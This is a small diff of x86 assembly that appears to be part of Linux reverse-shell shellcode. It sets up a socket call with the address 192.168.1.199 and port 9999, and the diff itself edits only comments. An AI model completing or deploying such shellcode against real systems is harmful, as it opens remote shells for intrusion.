@@ -14,8 +14,8 @@ _start:
         int 0x80
         xchg edx, eax
         mov al, 0x66
-        push 0xc701a8c0         ; 192.168.1.199 (put in reverse order)
-        push word 0x0f27        ; 9999 (put in reverse order)
+        push 0xc701a8c0         ; 192.168.1.199
+        push word 0x0f27        ; 9999
         inc ebx
         push word bx
         mov ecx, esp
